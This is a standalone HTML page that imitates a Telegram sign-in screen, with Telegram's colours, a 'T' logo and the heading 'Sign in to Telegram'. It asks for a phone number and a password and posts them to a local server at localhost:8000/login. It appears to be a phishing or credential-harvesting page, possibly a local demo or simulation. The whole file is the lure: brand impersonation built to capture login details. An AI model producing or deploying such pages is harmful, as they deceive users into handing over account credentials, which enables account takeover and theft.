<!DOCTYPE html>
<html>
<head>
    <title>Telegram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        
        .login-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
            width: 360px;
            padding: 40px;
            text-align: center;
        }
        
        .telegram-logo {
            width: 140px;
            height: 140px;
            margin: 0 auto 20px;
            background-color: #0088cc;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 60px;
            font-weight: bold;
        }
        
        h2 {
            color: #0088cc;
            margin-bottom: 30px;
            font-weight: 500;
        }
        
        form {
            display: flex;
            flex-direction: column;
        }
        
        label {
            text-align: left;
            margin-bottom: 8px;
            font-size: 14px;
            color: #666;
        }
        
        input[type="text"],
        input[type="password"] {
            padding: 12px 16px;
            margin-bottom: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #0088cc;
        }
        
        input[type="submit"] {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        input[type="submit"]:hover {
            background-color: #0077b3;
        }
        
        .sign-up-link {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        
        .sign-up-link a {
            color: #0088cc;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="telegram-logo">T</div>
        <h2>Sign in to Telegram</h2>
        <form action="http://localhost:8000/login" method="post">
            <label for="phone">Phone Number:</label>
            <input type="text" id="phone" name="phone" placeholder="+1 123 456 7890">
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="NEXT">
        </form>
        <div class="sign-up-link">
            Don't have an account? <a href="#">Sign up</a>
        </div>                          
    </div>
</body>
</html>
